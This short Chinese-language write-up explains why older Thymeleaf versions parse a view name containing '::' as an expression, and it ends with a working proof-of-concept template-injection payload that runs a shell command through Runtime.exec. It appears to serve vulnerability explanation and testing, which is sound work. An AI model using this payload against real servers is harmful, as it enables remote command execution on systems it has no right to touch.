漏洞原因

在低版本的 Thymeleaf中存在如下片段：

```
try {
   // By parsing it as a standard expression, we might profit from the expression cache
   fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
}
```



当return "xxx"中xxx包含::的时候xxx会被解析成表达式，语法中${}为执行表达式，而__${}__则为无论前后为什么都先计算大括号里面的表达式，所以最后的poc：

__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("touch executed").getInputStream()).next()}__::



